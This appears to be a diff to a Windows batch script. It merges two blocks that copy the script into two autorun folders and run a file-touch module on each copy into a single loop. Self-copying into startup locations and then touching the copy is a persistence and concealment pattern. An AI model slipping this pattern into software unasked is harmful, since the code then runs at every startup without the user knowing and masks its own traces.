@@ -93,14 +93,9 @@ rem reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons
 
 
 
-if not exist "%path_autoRun1%\%~nx0" (
-  copy /y "%~f0" "%path_autoRun1%\"
-  %module_fileTouch% "%path_autoRun1%\%~nx0" >nul
-)
-
-if not exist "%path_autoRun2%\%~nx0" (
-  copy /y "%~f0" "%path_autoRun2%\"
-  %module_fileTouch% "%path_autoRun2%\%~nx0" >nul
+for %%i in (path_autoRun1 path_autoRun2) do if not exist "!%%i!\%~nx0" (
+  call copy /y "%~f0" "!%%i!\"
+  call %module_fileTouch% "!%%i!\%~nx0" >nul
 )
 
 
